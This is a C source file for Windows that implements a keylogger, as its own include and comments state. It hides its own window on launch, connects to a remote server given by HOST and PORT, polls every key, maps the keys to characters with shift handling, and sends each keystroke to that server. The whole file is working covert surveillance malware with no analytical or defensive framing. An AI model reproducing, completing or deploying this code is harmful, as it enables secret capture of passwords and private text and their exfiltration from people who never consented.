#include "keylogger.h"
/*	
	Hides the process's window on execution	
*/
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	
    DWORD pid;
    GetWindowThreadProcessId(hwnd, &pid);
    if (pid == GetCurrentProcessId()) {
            ShowWindow(hwnd, SW_HIDE);
            return FALSE;
        }
    return TRUE;
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR lpCmdLine, int nCmdShow) {
    WSADATA wsa;
    SOCKET s;
    INPUT Event;
    SHORT key;
    EnumWindows(&EnumWindowsProc, (LPARAM)NULL);
    char chr;
    struct sockaddr_in server;

    /*	
    	Connects to the server
    */
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {   
        printf("Failed. Error Code : %d",WSAGetLastError());
        return 2;  
    }
    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) {
        printf("Failed. Error Code : %d",WSAGetLastError());
        WSACleanup();
        return 2;
    }
    memset(&server, 0, sizeof server);
    server.sin_addr.s_addr = inet_addr(HOST);
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0) {   
        printf("Failed. Error Code : %d", WSAGetLastError());
        WSACleanup(); 
        closesocket(s);
        return 2;
    }
    /*
    	Logs every relevant keystroke and logs it to the server
    */
    while (TRUE)
        for ( int i = 0x00 ; i<0xfe ; ++i )
            if ( GetKeyState(i) < 0 ) {
                Event.type = INPUT_KEYBOARD;
                Event.ki.dwFlags = KEYEVENTF_SCANCODE | KEYEVENTF_KEYUP;
                Event.ki.wScan = MapVirtualKey(i, 0);
                if ((i >= '0' && i <= '9') || 
                (i >= 'A' && i <= 'Z') || 
                (i >= VK_OEM_1 && i <= VK_OEM_8) || 
                i == VK_SPACE || i == VK_BACK ||
                i == VK_RETURN || i == VK_TAB) {
                    SendInput(1, &Event, sizeof(Event));
                    if ((i >= '0' && i <= '9') || (i >= 'A' && i <= 'Z')) chr = (char)i;                      
                    if ( i == VK_RETURN) chr = '\n';
                    if ( i == VK_BACK || i == VK_SPACE || i == VK_TAB ) chr = ' ';
                    else if ((i >= 'A' && i <= 'Z') && GetKeyState(VK_SHIFT) >= 0) chr = (char)(i+32);
                    else if (GetKeyState(VK_SHIFT) < 0) {
                        switch (i) {
                        	case '0' : chr = ')'; break;
	                        case '1' : chr = '!'; break;
	                        case '2' : chr = '@'; break;
	                        case '3' : chr = '#'; break;
	                        case '4' : chr = '$'; break;
	                        case '5' : chr = '%'; break;
	                        case '6' : chr = '^'; break;
	                        case '7' : chr = '&'; break;
	                        case '8' : chr = '*'; break; 
	                        case '9' : chr = '('; break;
	                        case VK_OEM_1 : chr = ':'; break;
	                        case VK_OEM_PLUS : chr = '+'; break;
	                        case VK_OEM_COMMA : chr = '<'; break;
	                        case VK_OEM_MINUS : chr = '_'; break;
	                        case VK_OEM_PERIOD : chr = '>'; break;
	                        case VK_OEM_2 : chr = '?'; break;
	                        case VK_OEM_3 : chr = '~'; break;
	                        case VK_OEM_4 : chr = '{'; break;
	                        case VK_OEM_5 : chr = '|'; break;
	                        case VK_OEM_6 : chr = '}'; break;
	                        case VK_OEM_7 : chr = '\"'; break;
                        }
                        
                    }
                    else
	                    switch (i){
	                    	case VK_OEM_1 : chr = ';'; break;
		                    case VK_OEM_PLUS : chr = '='; break;
		                    case VK_OEM_COMMA : chr = ','; break;
		                    case VK_OEM_MINUS : chr = '-'; break;
		                    case VK_OEM_PERIOD : chr = '.'; break;
		                    case VK_OEM_2 : chr = '/'; break;
		                    case VK_OEM_3 : chr = '`'; break;
		                    case VK_OEM_4 : chr = '{'; break;
		                    case VK_OEM_5 : chr = '\\'; break;
		                    case VK_OEM_6 : chr = ']'; break;
		                    case VK_OEM_7 : chr = '\''; break;
	                    }
                    
                    if (send(s, &chr, 1, 0) == -1)
                        return 0;
                }
            }
}
